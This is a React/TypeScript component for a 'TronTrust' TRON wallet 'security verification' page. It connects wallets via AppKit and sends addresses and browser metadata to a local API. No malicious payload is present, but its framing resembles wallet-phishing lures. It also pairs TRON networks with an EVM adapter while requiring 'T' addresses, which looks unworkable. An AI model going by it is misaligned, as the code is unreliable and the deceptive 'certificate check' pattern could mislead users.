// WalletConnect.js - TRON-ONLY Implementation (No Ethereum)
import { useState, useEffect } from 'react';
import { createAppKit } from '@reown/appkit';
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
import { FaBolt, FaCog, FaShieldAlt, FaQuestionCircle, FaWallet } from 'react-icons/fa';
import logo from './logo.png';
import './styles.css';

type WalletData = {
  address: string;
  chainId: number;
  network: string;
  walletType: string;
  sessionId: string;
  metadata: {
    userAgent: string;
    timestamp: number;
  };
};

const WalletConnect = () => {
  const [currentWallet, setCurrentWallet] = useState<WalletData | null>(null);
  const [modal, setModal] = useState<ReturnType<typeof createAppKit> | null>(null);
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
  const [isConnecting, setIsConnecting] = useState(false);
  const [connectionStatus, setConnectionStatus] = useState<'idle' | 'connecting' | 'connected' | 'error'>('idle');

  const toggleMobileMenu = () => {
    setMobileMenuOpen(!mobileMenuOpen);
  };

  // API Configuration
  const API_BASE_URL = 'http://localhost:5000/api';
  const PROJECT_ID = '048110749acfc9f73e40e560cd1c11ec'; // Replace with your actual project ID

  const log = (message: string) => {
    console.log(`[TronTrust] ${message}`);
  };

  // TRON Network Definitions (Custom since AppKit doesn't include TRON by default)
  const tronMainnet = {
    id: 728126428, // TRON Mainnet chain ID
    name: 'TRON Mainnet',
    network: 'tron',
    nativeCurrency: {
      decimals: 6,
      name: 'TRON',
      symbol: 'TRX',
    },
    rpcUrls: {
      public: { http: ['https://api.trongrid.io'] },
      default: { http: ['https://api.trongrid.io'] },
    },
    blockExplorers: {
      default: { name: 'Tronscan', url: 'https://tronscan.org' },
    },
  };

  const tronShasta = {
    id: 2494104990, // TRON Shasta Testnet chain ID
    name: 'TRON Shasta Testnet',
    network: 'tron-shasta',
    nativeCurrency: {
      decimals: 6,
      name: 'TRON',
      symbol: 'TRX',
    },
    rpcUrls: {
      public: { http: ['https://api.shasta.trongrid.io'] },
      default: { http: ['https://api.shasta.trongrid.io'] },
    },
    blockExplorers: {
      default: { name: 'Shasta Tronscan', url: 'https://shasta.tronscan.org' },
    },
    testnet: true,
  };

  // Initialize AppKit for TRON ONLY - Remove all Ethereum references
  useEffect(() => {
    const initializeAppKit = async () => {
      try {
        // Initialize Wagmi Adapter specifically for TRON networks ONLY
        const wagmiAdapter = new WagmiAdapter({
          projectId: PROJECT_ID,
          networks: [tronMainnet, tronShasta] // TRON networks ONLY
        });

        // Create AppKit instance with TRON-ONLY configuration
        const appKit = createAppKit({
          adapters: [wagmiAdapter],
          projectId: PROJECT_ID,
          networks: [tronMainnet, tronShasta], // TRON networks ONLY
          defaultNetwork: tronMainnet, // Default to TRON mainnet
          metadata: {
            name: 'TronTrust', // NO SPACE - exact match for popup
            description: 'TRON Wallet Security Verification App',
            url: 'https://trontrust.io', // Use your production domain
            icons: ['https://trontrust.io/favicon.ico'] // Your actual icon URL
          },
          features: {
            analytics: true,
            email: false,
            socials: [], // No social logins
            history: true,
            onramp: false // No fiat onramp
          },
          // TRON-specific UI configuration
          themeMode: 'light',
          themeVariables: {
            '--w3m-font-family': 'Inter, sans-serif',
            '--w3m-accent': '#FF060A', // TRON red color
            '--w3m-color-mix': '#FF060A',
            '--w3m-color-mix-strength': 20
          },
          // TRON-specific chain images
          chainImages: {
            728126428: 'https://cryptologos.cc/logos/tron-trx-logo.png', // TRON mainnet
            2494104990: 'https://cryptologos.cc/logos/tron-trx-logo.png' // TRON testnet
          },
          // Include TRON-compatible wallets only
          includeWalletIds: [
            '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0', // Trust Wallet
            '38f5d18bd8522c244bdd70cb4a68e0e718865155811c043f052fb9f1c51de662', // Bitget
            '19177a98252e07ddfc9af2083ba8e07ef627cb6103467ffebb3f8f4205fd7927', // Ledger Live
            'c286eebc742a537cd1d6818363e9dc53b21759a1e8e5d9b263d0c03ec7703576', // imToken
          ],
          // Exclude Ethereum-only wallets
          excludeWalletIds: [
            'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96', // MetaMask (Ethereum focused)
          ]
        });

        setModal(appKit);
        log('TronTrust AppKit initialized successfully for TRON network ONLY');

        // Enhanced account connection listener for TRON ONLY
        appKit.subscribeAccount((account: { isConnected: boolean; address?: string; caipAddress?: string; chainId?: number }) => {
          log(`Account state changed: ${JSON.stringify(account)}`);
          
          if (account.isConnected && account.address) {
            // Validate TRON address format (should start with T)
            if (!account.address.startsWith('T')) {
              log('Invalid TRON address format - disconnecting');
              setConnectionStatus('error');
              setIsConnecting(false);
              return;
            }

            log(`TRON Wallet connected: ${account.address}`);
            setIsConnecting(false);
            setConnectionStatus('connected');
            
            // Ensure we're using TRON chain IDs ONLY
            const chainId = account.chainId || 728126428; // Default to TRON mainnet
            
            // Validate chain ID is TRON
            if (chainId !== 728126428 && chainId !== 2494104990) {
              log(`Invalid chain ID ${chainId} - expecting TRON chain ID`);
              setConnectionStatus('error');
              setIsConnecting(false);
              return;
            }
            
            const walletData = {
              address: account.address,
              chainId: chainId,
              network: chainId === 728126428 ? 'TRON Mainnet' : 'TRON Shasta Testnet',
              walletType: 'TRON',
              sessionId: Date.now().toString(),
              metadata: {
                userAgent: navigator.userAgent,
                timestamp: Date.now()
              }
            };
            
            setCurrentWallet(walletData);
            saveWalletToAPI(walletData);
          } else {
            log('TRON Wallet disconnected');
            setIsConnecting(false);
            setConnectionStatus('idle');
            if (currentWallet) {
              removeWalletFromAPI(currentWallet.address);
            }
            setCurrentWallet(null);
          }
        });

        // Enhanced network change listener specifically for TRON ONLY
        appKit.subscribeNetwork((network: { chainId?: string | number }) => {
          log(`Network changed: ${JSON.stringify(network)}`);
          
          let chainIdNum: number | undefined;
          if (typeof network.chainId === 'string') {
            chainIdNum = parseInt(network.chainId, 10);
          } else if (typeof network.chainId === 'number') {
            chainIdNum = network.chainId;
          }
          
          // Ensure we're ONLY dealing with TRON chain IDs
          if (currentWallet && chainIdNum !== undefined && !isNaN(chainIdNum)) {
            // Validate it's a TRON chain ID ONLY
            if (chainIdNum === 728126428 || chainIdNum === 2494104990) {
              log(`TRON network changed to: ${chainIdNum}`);
              const updatedWallet = {
                ...currentWallet,
                chainId: chainIdNum,
                network: chainIdNum === 728126428 ? 'TRON Mainnet' : 'TRON Shasta Testnet'
              };
              setCurrentWallet(updatedWallet);
              saveWalletToAPI(updatedWallet);
            } else {
              // Non-TRON chain detected - disconnect
              log(`Non-TRON chain detected (${chainIdNum}) - disconnecting`);
              handleDisconnect();
              setConnectionStatus('error');
            }
          }
        });

        // Enhanced modal state listener
        appKit.subscribeState((state: any) => {
          log(`Modal state: ${JSON.stringify(state)}`);
          if (state.open === false && isConnecting) {
            // Modal closed while connecting - reset state if not connected
            setTimeout(() => {
              if (!currentWallet) {
                setIsConnecting(false);
                setConnectionStatus('idle');
              }
            }, 1000);
          }
        });

      } catch (error) {
        log(`Error initializing TronTrust AppKit: ${error instanceof Error ? error.message : String(error)}`);
        setConnectionStatus('error');
        setIsConnecting(false);
      }
    };

    initializeAppKit();
  }, []);

  // Enhanced API Functions
  const saveWalletToAPI = async (walletData: WalletData) => {
    try {
      log(`Saving TRON wallet to API: ${walletData.address}`);
      const response = await fetch(`${API_BASE_URL}/connect-wallet`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(walletData)
      });
      
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }
      
      const result = await response.json();
      if (result.success) {
        log(`TRON wallet saved to API successfully: ${walletData.address}`);
        return result;
      } else {
        log(`Error saving TRON wallet: ${result.error || 'Unknown error'}`);
        return null;
      }
    } catch (error) {
      log(`API Error saving TRON wallet: ${error instanceof Error ? error.message : String(error)}`);
      return null;
    }
  };

  const removeWalletFromAPI = async (address: string) => {
    try {
      log(`Removing TRON wallet from API: ${address}`);
      const response = await fetch(`${API_BASE_URL}/disconnect-wallet`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ address })
      });
      
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }
      
      const result = await response.json();
      if (result.success) {
        log(`TRON wallet removed from API successfully: ${address}`);
        return result;
      } else {
        log(`Error removing TRON wallet: ${result.error || 'Unknown error'}`);
        return null;
      }
    } catch (error) {
      log(`API Error removing TRON wallet: ${error instanceof Error ? error.message : String(error)}`);
      return null;
    }
  };

  // Enhanced Button Handlers
  const handleConnect = async () => {
    if (!modal) {
      log('Cannot open TRON wallet connection modal: modal is not initialized.');
      setConnectionStatus('error');
      return;
    }

    try {
      log('Opening TRON wallet connection modal...');
      setIsConnecting(true);
      setConnectionStatus('connecting');
      
      // Open modal with TRON-specific options
      await modal.open({ 
        view: 'Connect'
      });
      
      log('TRON wallet connection modal opened successfully');
    } catch (error) {
      log(`Error opening TRON connection modal: ${error instanceof Error ? error.message : String(error)}`);
      setIsConnecting(false);
      setConnectionStatus('error');
    }
  };

  const handleDisconnect = async () => {
    if (!modal) {
      log('Cannot disconnect TRON wallet: modal is not initialized.');
      return;
    }

    try {
      log('Disconnecting TRON wallet...');
      await modal.disconnect();
      log('TRON wallet disconnected successfully');
    } catch (error) {
      log(`Error disconnecting TRON wallet: ${error instanceof Error ? error.message : String(error)}`);
    }
  };

  // Get connection button text based on state
  const getConnectionButtonText = () => {
    switch (connectionStatus) {
      case 'connecting':
        return 'Connecting to TRON...';
      case 'connected':
        return 'Disconnect TRON Wallet';
      case 'error':
        return 'Retry TRON Connection';
      default:
        return 'Connect TRON Wallet';
    }
  };

  // Get connection button disabled state
  const isConnectionButtonDisabled = () => {
    return isConnecting || connectionStatus === 'connecting';
  };

  return (
    <div>
      <div className="app">
        <nav className="nav">
          <div className="nav-container">
            <a href="/" className="flex items-center space-x-2">
              <img src={logo} alt="TronTrust Logo" className="nav-logo" />
            </a>
            
            <div className="nav-links">
              <a href="#" className="nav-link">
                <FaBolt className="text-sm" />
                <span className="text-sm">Features</span>
              </a>
              <a href="#" className="nav-link">
                <FaCog className="text-sm" />
                <span className="text-sm">How It Works</span>
              </a>
              <a href="#" className="nav-link">
                <FaShieldAlt className="text-sm" />
                <span className="text-sm">Verification Status</span>
              </a>
              <a href="#" className="nav-link">
                <FaQuestionCircle className="text-sm" />
                <span className="text-sm">FAQ</span>
              </a>
            </div>
            
            <button className="nav-button">
              <FaWallet className="text-sm" />
              <span>TRON Wallet Security Check</span>
            </button>
            
            <button 
              className="mobile-menu-button" 
              onClick={toggleMobileMenu}
              aria-label="Toggle menu"
            >
              <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 6h16M4 12h16M4 18h16"></path>
              </svg>
            </button>
          </div>
          
          <div className={`mobile-menu ${mobileMenuOpen ? 'active' : ''}`}>
            <div className="mobile-menu-links">
              <a href="#" className="mobile-menu-link">
                <FaBolt className="text-sm" />
                <span className="text-sm">Features</span>
              </a>
              <a href="#" className="mobile-menu-link">
                <FaCog className="text-sm" />
                <span className="text-sm">How It Works</span>
              </a>
              <a href="#" className="mobile-menu-link">
                <FaShieldAlt className="text-sm" />
                <span className="text-sm">Verification Status</span>
              </a>
              <a href="#" className="mobile-menu-link">
                <FaQuestionCircle className="text-sm" />
                <span className="text-sm">FAQ</span>
              </a>
              <button className="mobile-menu-button-main">
                <FaWallet className="text-sm" />
                <span>TRON Wallet Security Check</span>
              </button>
            </div>
          </div>
        </nav>
        
        <main className="main-container">
          <div className="content-container">
            <div className="progress-container">
              <div className="progress-bar">
                <div className="progress-fill" id="progressBar"></div>
              </div>
              
              <div className="steps-container">
                <div className="step">
                  <div className="step-icon" id="step1">
                    <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
                      <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path>
                    </svg>
                  </div>
                  <span className="step-label">Get Started</span>
                </div>
                
                <div className="step">
                  <div className={`step-icon ${connectionStatus === 'connected' ? '' : 'inactive'}`} id="step2">
                    <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 24 24">
                      <path d="M9.5 2A1.5 1.5 0 0 0 8 3.5v1A1.5 1.5 0 0 0 9.5 6h5A1.5 1.5 0 0 0 16 4.5v-1A1.5 1.5 0 0 0 14.5 2h-5ZM12 7a5 5 0 0 1 5 5v1.086l1.707 1.707A1 1 0 0 1 18 16.5V17a1 1 0 0 1-1 1H7a1 1 0 0 1-1-1v-.5a1 1 0 0 1 .293-.707L8 14.086V12a5 5 0 0 1 5-5Z" />
                    </svg>
                  </div>
                  <span className={`step-label ${connectionStatus === 'connected' ? '' : 'inactive'}`}>Scan</span>
                </div>
                
                <div className="step">
                  <div className="step-icon inactive" id="step3">
                    <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 24 24">
                      <path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-5 14H7v-2h7v2zm3-4H7v-2h10v2zm0-4H7V7h10v2z" />
                    </svg>
                  </div>
                  <span className="step-label inactive">Results</span>
                </div>
                
                <div className="step">
                  <div className="step-icon inactive" id="step4">
                    <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 24 24">
                      <path d="M12 2C13.1 2 14 2.9 14 4C14 5.1 13.1 6 12 6C10.9 6 10 5.1 10 4C10 2.9 10.9 2 12 2ZM21 9V7L15 1H5C3.89 1 3 1.89 3 3V21C3 22.11 3.89 23 5 23H19C20.11 23 21 22.11 21 21V9M19 9H14V4L19 9Z" />
                    </svg>
                  </div>
                  <span className="step-label inactive">Waitlist</span>
                </div>
              </div>
            </div>
            
            <div className="heading-container">
              <h1 className="main-heading">
                CHECK YOUR TRON CERTIFICATE NOW
              </h1>
              <p className="sub-heading">
                Connect your TRON wallet to begin the security verification process
              </p>
            </div>
            
            <div className="card-container">
              <div className="card">
                <div className="card-row">
                  <div className="card-content">
                    <div className="card-icon" style={{ color: '#FF060A' }}>
                      <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
                        <path d="M12 2L2 7L12 12L22 7L12 2ZM2 17L12 22L22 17M2 12L12 17L22 12" />
                      </svg>
                    </div>
                    <div className="card-text">
                      <h3 className="card-title">TRON WALLET</h3>
                      <p className="card-description">Connect to TRON Network Only</p>
                    </div>
                  </div>
                  <button 
                    onClick={connectionStatus === 'connected' ? handleDisconnect : handleConnect}
                    className={`card-button ${isConnectionButtonDisabled() ? 'opacity-50 cursor-not-allowed' : ''}`}
                    disabled={isConnectionButtonDisabled()}
                    style={{ backgroundColor: '#FF060A', borderColor: '#FF060A' }}
                  >
                    {isConnecting && (
                      <svg className="animate-spin -ml-1 mr-3 h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                      </svg>
                    )}
                    {getConnectionButtonText()}
                  </button>
                </div>
              </div>
              
              <div className="card">
                <div className="card-content">
                  <div className="card-icon" style={{ color: '#FF060A' }}>
                    <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 3l7 4v5c0 5-3.5 9.74-7 11-3.5-1.26-7-6-7-11V7l7-4z" />
                      <circle cx="12" cy="12" r="3" fill="currentColor" />
                    </svg>
                  </div>
                  <div className="card-text">
                    <h3 className="card-title">TRON NETWORK SECURITY</h3>
                    <p className="card-description">We only connect to TRON network. No Ethereum or other chains supported.</p>
                  </div>
                </div>
              </div>
            </div>

            {/* Connection Status Indicator */}
            {connectionStatus !== 'idle' && (
              <div className={`connection-status ${connectionStatus}`} style={{ 
                padding: '12px 20px',
                borderRadius: '8px',
                marginTop: '20px',
                display: 'flex',
                alignItems: 'center',
                gap: '10px',
                backgroundColor: connectionStatus === 'connecting' ? '#fff3f3' : 
                               connectionStatus === 'connected' ? '#f3fff3' : 
                               connectionStatus === 'error' ? '#ffebee' : '#f5f5f5',
                color: connectionStatus === 'connecting' ? '#FF060A' : 
                       connectionStatus === 'connected' ? '#2e7d32' : 
                       connectionStatus === 'error' ? '#c62828' : '#666',
                border: `1px solid ${connectionStatus === 'connecting' ? '#FF060A' : 
                                   connectionStatus === 'connected' ? '#c8e6c9' : 
                                   connectionStatus === 'error' ? '#ffcdd2' : '#e0e0e0'}`
              }}>
                {connectionStatus === 'connecting' && (
                  <svg className="animate-spin h-4 w-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg>
                )}
                {connectionStatus === 'connected' && <span>🔥</span>}
                {connectionStatus === 'error' && <span>❌</span>}
                <span>
                  {connectionStatus === 'connecting' && 'Connecting to TRON network...'}
                  {connectionStatus === 'connected' && 'Successfully connected to TRON network'}
                  {connectionStatus === 'error' && 'TRON connection failed. Please try again.'}
                </span>
              </div>
            )}

            {/* Connected TRON Wallet Information */}
            {currentWallet && (
              <div className="wallet-info" style={{ 
                backgroundColor: '#fff3f3', 
                padding: '20px', 
                borderRadius: '8px', 
                marginTop: '20px',
                border: '2px solid #FF060A'
              }}>
                <h3 style={{ color: '#FF060A', marginBottom: '15px', display: 'flex', alignItems: 'center', gap: '8px' }}>
                  <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M12 2L2 7L12 12L22 7L12 2ZM2 17L12 22L22 17M2 12L12 17L22 12" />
                  </svg>
                  Connected TRON Wallet:
                </h3>
                <div style={{ display: 'grid', gap: '10px' }}>
                  <p><strong>TRON Address:</strong> <span style={{ fontFamily: 'monospace', color: '#FF060A', wordBreak: 'break-all' }}>{currentWallet.address}</span></p>
                  <p><strong>Network:</strong> <span style={{ color: '#FF060A', fontWeight: 'bold' }}>{currentWallet.network}</span></p>
                  <p><strong>Chain ID:</strong> <span style={{ color: '#666' }}>{currentWallet.chainId}</span></p>
                  <p><strong>Session ID:</strong> <span style={{ fontFamily: 'monospace', color: '#666' }}>{currentWallet.sessionId}</span></p>
                </div>
                <div style={{ 
                  marginTop: '15px', 
                  padding: '12px', 
                  backgroundColor: '#e8f5e8', 
                  borderRadius: '6px',
                  color: '#155724',
                  display: 'flex',
                  alignItems: 'center',
                  gap: '8px'
                }}>
                  🔥 <strong>Successfully connected to TRON network and synced with API</strong>
                </div>
              </div>
            )}
          </div>
        </main>
      </div>
    </div>
  );
};

export default WalletConnect;